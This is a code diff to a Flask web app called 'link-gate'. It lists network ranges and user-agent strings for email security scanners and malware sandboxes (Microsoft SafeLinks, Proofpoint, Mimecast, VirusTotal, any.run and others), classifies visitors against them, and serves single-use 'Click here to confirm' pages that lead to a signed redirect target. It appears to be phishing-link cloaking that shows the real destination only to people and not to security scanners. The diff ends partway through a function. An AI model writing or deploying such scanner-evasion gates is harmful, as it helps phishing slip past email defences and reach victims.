@@ -8,10 +8,10 @@ from ipaddress import ip_address, ip_network
 import httpx
 from flask import (
     Flask, request, redirect, render_template_string,
-    abort, make_response, jsonify,
+    make_response, jsonify,
 )
 from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired
-from asgiref.wsgi import WsgiToAsgi  # Ensures flawless async runtime support on Vercel
+from asgiref.wsgi import WsgiToAsgi
 
 # ---------------------------------------------------------------------------
 # config
@@ -37,90 +37,39 @@ logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("link-gate")
 
 # ---------------------------------------------------------------------------
-# known email URL-defense scanner networks
+# known scanner networks & UAs
 # ---------------------------------------------------------------------------
-EOP = [  # Microsoft Defender for Office 365 / SafeLinks / EOP
-    ip_network("40.92.0.0/15"),
-    ip_network("40.107.0.0/16"),
-    ip_network("52.100.0.0/14"),
-    ip_network("104.47.0.0/17"),
-    ip_network("13.107.6.152/31"),
-    ip_network("13.107.18.10/31"),
-    ip_network("13.107.128.0/22"),
-    ip_network("23.103.160.0/20"),
+EOP = [
+    ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
+    ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"),
+    ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
+    ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
 ]
-
-PROOFPOINT = [
-    ip_network("148.163.0.0/16"),
-    ip_network("67.231.144.0/20"),
-]
-
-MIMECAST = [
-    ip_network("207.211.30.0/23"),
-    ip_network("91.220.42.0/24"),
-]
-
-BARRACUDA = [
-    ip_network("64.235.144.0/20"),
-    ip_network("209.240.128.0/19"),
-]
-
-TALOS = [
-    ip_network("208.75.176.0/22"),
-    ip_network("216.160.0.0/19"),
-]
-
-GOOGLE_SAFEBROWSING = [
-    ip_network("66.249.64.0/19"),
-    ip_network("2001:4860::/32"),
-]
+PROOFPOINT = [ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20")]
+MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
+BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
+TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
+GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]
 
 SCANNER_NETS = {
-    "microsoft_eop": EOP,
-    "proofpoint": PROOFPOINT,
-    "mimecast": MIMECAST,
-    "barracuda": BARRACUDA,
-    "cisco_talos": TALOS,
-    "google_safebrowsing": GOOGLE_SAFEBROWSING,
+    "microsoft_eop": EOP, "proofpoint": PROOFPOINT, "mimecast": MIMECAST,
+    "barracuda": BARRACUDA, "cisco_talos": TALOS, "google_safebrowsing": GOOGLE_SAFEBROWSING,
 }
 
 SCANNER_UA_TOKENS = (
-    "microsoft office",
-    "safelinks",
-    "microsoft preview",
-    "proofpoint",
-    "pp-url",
-    "mimecast",
-    "barracuda",
-    "talos",
-    "urlscan",
-    "urlscan.io",
-    "virustotal",
-    "any.run",
-    "hybrid-analysis",
-    "joesandbox",
-    "googlebot",
-    "google-safety",
-    "bingpreview",
-    "facebookexternalhit",
-    "slackbot",
-    "twitterbot",
-    "linkedinbot",
-    "discordbot",
-    "telegrambot",
-    "whatsapp",
+    "microsoft office", "safelinks", "microsoft preview", "proofpoint",
+    "pp-url", "mimecast", "barracuda", "talos", "urlscan", "urlscan.io",
+    "virustotal", "any.run", "hybrid-analysis", "joesandbox", "googlebot",
+    "google-safety", "bingpreview", "facebookexternalhit", "slackbot",
+    "twitterbot", "linkedinbot", "discordbot", "telegrambot", "whatsapp",
     "skypeuripreview",
 )
 
-# ---------------------------------------------------------------------------
-# helpers
-# ---------------------------------------------------------------------------
 def client_ip() -> str:
     xff = request.headers.get("X-Forwarded-For", "")
     if xff:
         return xff.split(",")[0].strip()
     return request.remote_addr or ""
-
 
 def classify(ip: str, ua: str) -> dict:
     out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
@@ -145,7 +94,6 @@ def classify(ip: str, ua: str) -> dict:
                 break
     return out
 
-
 async def kv_setnx(key: str, ttl: int) -> bool:
     if not KV_URL or not KV_TOKEN:
         return _local_setnx(key, ttl)
@@ -163,9 +111,7 @@ async def kv_setnx(key: str, ttl: int) -> bool:
             log.error(f"External KV storage failure: {e}")
             return False
 
-
 _LOCAL_SEEN: dict[str, float] = {}
-
 
 def _local_setnx(key: str, ttl: int) -> bool:
     now = time.time()
@@ -176,7 +122,6 @@ def _local_setnx(key: str, ttl: int) -> bool:
     _LOCAL_SEEN[key] = now + ttl
     return True
 
-
 async def emit_log(event: dict) -> None:
     log.info(json.dumps(event, separators=(",", ":")))
     if LOG_WEBHOOK_URL:
@@ -186,15 +131,6 @@ async def emit_log(event: dict) -> None:
         except httpx.HTTPError:
             pass
 
-
-def sign_token(target: str, title: str = "Confirm your request",
-               body: str = "Click the button below to continue.",
-               cta: str = "Click here to confirm") -> str:
-    return serializer.dumps({
-        "target": target, "title": title, "body": body, "cta": cta,
-    })
-
-
 def _static_page(title: str, text: str, status_code: int):
     html = f"""<!doctype html><html><head><meta charset="utf-8"><title>{title}</title>
     <style>body{{font-family:system-ui,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9}}
@@ -202,10 +138,6 @@ def _static_page(title: str, text: str, status_code: int):
     </head><body><div class="c"><h1>{title}</h1><p>{text}</p></div></body></html>"""
     return make_response(html, status_code)
 
-
-# ---------------------------------------------------------------------------
-# templates & core endpoints
-# ---------------------------------------------------------------------------
 LANDING = """<!doctype html>
 <html lang="en">
 <head>
@@ -237,12 +169,11 @@ LANDING = """<!doctype html>
 </body>
 </html>"""
 
-
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"ok": True, "ts": int(time.time())})
 
-
+# --- ROUTE 1: Clean GET Landing Page Execution Only ---
 @app.route("/r/<token>", methods=["GET"])
 async def landing(token: str):
     try:
@@ -261,7 +192,7 @@ async def landing(token: str):
 
     html = render_template_string(
         LANDING,
-        action=f"/r/{token}",
+        action=f"/submit/{token}",  # Points cleanly to distinct submission route
         token=token,
         nonce=nonce,
         title=data.get("title", "Confirm your request"),
@@ -280,8 +211,8 @@ async def landing(token: str):
     )
     return resp
 
-
-@app.route("/r/<token>", methods=["POST"])
+# --- ROUTE 2: Clean POST Verification Processing Only ---
+@app.route("/submit/<token>", methods=["POST"])
 async def execute(token: str):
     if request.form.get("email_confirm_hp"):
         return _static_page("Submission Blocked", "Automated behavior detected.", 400)
@@ -290,7 +221,7 @@ async def execute(token: str):
     cookie_val = request.cookies.get("gate_session")
 
     if not cookie_val or not submitted_nonce:
-        return _static_page("Missing Context", "Session cookie or payload verification context missing.", 400)
+        return _static_page("Missing Context", "Session cookie or verification payload missing.", 400)
 
     try:
         cookie_data = cookie_serializer.loads(cookie_val, max_age=GATE_TTL)
@@ -299,4 +230,19 @@ async def execute(token: str):
 
     is_nonce_valid = secrets.compare_digest(cookie_data["n"], submitted_nonce)
     is_token_valid = secrets.compare_digest(cookie_data["t"], token)
-asgi_app = WsgiToAsgi(app)
+    is_fresh = (time.time() - cookie_data["ts"]) < GATE_TTL
+
+    if not (is_nonce_valid and is_token_valid and is_fresh):
+        return _static_page("Verification Failed", "Security context verification payload mismatched.", 400)
+
+    # Atomic distributed validation block to strictly deny race conditions across serverless instances
+    is_first_click = await kv_setnx(f"click:{token[:32]}:{submitted_nonce}", GATE_TTL)
+    if not is_first_click:
+        return _static_page("Link Consumed", "This single-use action link has already been utilized.", 410)
+
+    try:
+        data = serializer.loads(token, max_age=TOKEN_TTL)
+    except (SignatureExpired, BadSignature):
+        return _static_page("Invalid Token", "Target signature metadata validation error.", 410)
+
+    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
